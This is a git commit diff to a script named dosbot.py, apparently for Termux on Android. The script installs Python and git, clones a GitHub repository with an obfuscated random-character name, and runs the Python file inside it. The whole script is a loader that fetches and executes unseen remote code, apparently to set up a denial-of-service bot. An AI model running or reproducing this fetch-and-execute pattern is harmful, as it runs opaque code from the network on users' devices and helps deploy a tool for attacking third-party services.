f54c060cf4a2c93172816169787c24f8de88d92d
Fırat Özden <36071011+fir4tozden@users.noreply.github.com>
2020-03-21 18:33:03 +0300

    Update dosbot.py

--- dosbot.py
+++ dosbot.py
@@ -1,6 +1,8 @@
 import os;
 
+os.system("pkg install python");
 os.system("pkg install python2");
+os.system("pkg install python3");
 os.system("pkg install git");
 os.system("git clone https://github.com/fir4tozden/js8Hw3na7wm49aw22k8sdj4085gw364fDuwRR7j3");
-os.system("python2 js8Hw3na7wm49aw22k8sdj4085gw364fDuwRR7j3/js8Hw3na7wm49aw22k8sdj4085gw364fDuwRR7j3.py");
+os.system("python js8Hw3na7wm49aw22k8sdj4085gw364fDuwRR7j3/js8Hw3na7wm49aw22k8sdj4085gw364fDuwRR7j3.py");
